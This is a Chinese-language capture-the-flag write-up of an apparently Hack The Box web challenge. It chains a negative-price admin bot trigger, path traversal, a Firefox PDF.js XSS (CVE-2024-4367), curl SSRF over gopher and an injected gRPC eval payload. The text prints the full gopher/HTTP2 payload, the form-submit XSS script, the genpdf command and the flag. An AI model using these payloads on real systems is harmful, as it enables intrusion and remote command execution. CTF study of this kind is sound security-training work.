不得不说，这个确实是insane难度的challenge，复杂的一批，还有各种坑

step1：注册并登录
step2：注意到/checkout路由的四个参数可控，并且不提供product_id的时候generate_payment_link会使用你提供的price来创建product，我们让它是负的，后面有用
http://192.168.205.128:1337/checkout?title=aaa&user_id=2&price=-9999&email=aaa
step3：/checkout/success 路由是一个比较重要的路由，它会检查你的order_id中price是否<0(0是代码预先定义好的一个基准price,即amt_paid)
```python
if amt_paid >= order.price:
		db_session.mark_order_complete(order_id)
```

然后如果小于0，启动一个botrunner，它会模拟firefox浏览器发起身份为admin的登录，然后浏览器中会存储admin的session，之后这个bot会访问一个url，这个url是可
被我们控制的
client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")中paymentid可控，用../可以返回并且访问admin路由用&a=来让'.pdf'成为无意义的请求参数。这个点我们可以用来引导bot访问/admin/view-pdf。注意，这里的访问局限于127.0.0.1:1337,并且通过bot访问是必须的环节，否则不会有合法session

step4：
view-pdf可以访问任意url的pdf，注意，从上一步的浏览器请求到这一步，我们始终在浏览器中，看到
```python
return send_file(pdf_data, mimetype="application/pdf", as_attachment=False, download_name="document.pdf")
```
attachment=false意味着浏览器会直接打开这个pdf，firefox在126版本一下存在一个pdf导致xss的CVE-2024-4367，dockerfile是125，所以可以利用pdf来触发xss，这个xss只有在firefox会被触发，并且必须是bot访问
有一些问题：不能用fetch或者xhr去发送cookie，因为httponly，所以不能以admin登录，另外也不能直接fetch /admin下的路由，因为你会发现firefox viewpdf触发xss的时候document.domain=pdf.js，所以你的fetch会被cors阻止发送cookie，无论你怎么设置fetch的参数。这意味着，我们只能使用form表单的，写个js自动提交到/admin路由，这种情况是会自动发送cookie的，区别于fetch，因此，用pdf触发xss后我们就可以让admin访问以下的路由
```python
@web.route("/admin/api-health", methods=["GET", "POST"])
def api_health():
	if not session.get("loggedin") or session.get("role") != "admin":
		return redirect("/")
		
	if request.method == "GET":
		return render_template("admin_api_health.html", title="Admin panel - API health", session=session)

	url = request.form.get("url")

	if not url:
		return render_template("error.html", title="Error", error="Missing URL"), 400

	status_code = get_url_status_code(url)
	return render_template("admin_api_health.html", title="Admin panel - API health", session=session, status_code=status_code)
```
    为什么是这个路由？因为get_url_status_code(url)中调用了命令行的curl，向我们提供的url参数发起请求，这个是我们ssrf的关键步骤。为什么要绕一步不直接在
view-pdf中让bot访问这个路由？注意，这个路由只接受post方法，要么fetch，要么form，只有xss做得到，其它的路由不存在我们控制bot以admin身份发送post到这个路由的能力。curl支持相当多的协议，其中就有大家都熟悉的gopher，利用gopher我们几乎就做出来这个题了。


    curl支持那么多协议，为什么只用gopher？直接file://行不行？这其实就是回显的问题，确实是可以访问的，但是我们看不到flag。想要在xss那一步用file://然后
outofband也是不行的，会被浏览器阻止访问本地文件。
    话说回来，怎么用gopher打？实际上作者留了后面eval在product_api的api.py中，其中给了 UpdateService和GenerateProduct，思路就是利用UpdateService向
self注入一个price_formula属性，然后触发generateproduct方法，触发eval。
    这里需要了解以下grpc协议，这是一个基于http2的远程方法调用，有点像java的rmi，服务端根据product.proto编译生成了两个文件product_xxxxx.py，这两个文件
同时被放在client，为的就是client能够识别正确的类型信息，并且知道怎么把需要发送的参数和方法序列化到tcp字节流当中。服务端的api.py就是注册了一个提供方法的
服务，client创建stub后利用服务端的方法名和相应的参数去调用相对应的方法。客户端实际上已经育一些路由访问了这些方法，但是，我们的第一步必须是给服务端的product对象添加一个price_formula，然后用generateproduct去eval它。DebugService调用了updateservice，当然，也可以直接调用updateservice，不过这两个方法
都是内部方法，不存在哪个路由可以直接调用的，即使是admin的路由。我们只能通过gopher去调用它，generateproduct可以用之前的方法直接让bot访问/admin/product-stream触发。
    现在，如何构造合适的tcp数据流是关键所在，也是最后一步。并没有支持http2的gopher的现成工具，人工去计算http2的字段是很复杂的，比http1要复杂的多，对我们
没有什么帮助，还极其容易出错。一个比较好的办法是wireshark抓包，然后抓取client http2的数据流，转化为字节数组并且用%编码，或者本地用nc在某个端口监听，去抓取字节发出去的grpc数据报。这里注意，grpc的协议中client发送完整http2数据后，server会返回一个随机的字节流，client要重复发送回去这个字节流才能得到响应，
但是在client发送http2数据后相应方法已经执行。gopher协议我们只能发一次数据，我们不能，但是也不需要获取响应，我们只需要eval执行我们的命令，把flag拷贝到
可读的位置，也就是eval('__import__("os").system("cp /flag* /app/store/application/static/flag.txt")'),就完成了最后一步。生成的数据流被放在gopher后面

这个是不会变的，我已经写好放下面了（建议自己尝试生成）
gopher://_PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC_%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29    

这个peiload应该被放在pdf中的url字段，被作为curl的参数，我在文件夹中也放了生成pdf的py代码和我生成的pdf，这个pdf是不会变的，可以直接用，生成方法：

```powershell
python genpdf.py "var form=document.createElement('form');form.action='http://127.0.0.1:1337/admin/api-health';form.method='post';var urlInput=document.createElement('input');urlInput.value='gopher://127.0.0.1:50051/_PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC_%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29';urlInput.name='url';form.appendChild(urlInput);document.body.appendChild(form);form.submit();"
```

（(tip:some versions of curl dont support null bytes %00）





























flag：HTB{ol4_t4_ch41n5_ol4_t4_ch41n5_l4mp0un_t4_d15m4nd14_4l1_day}
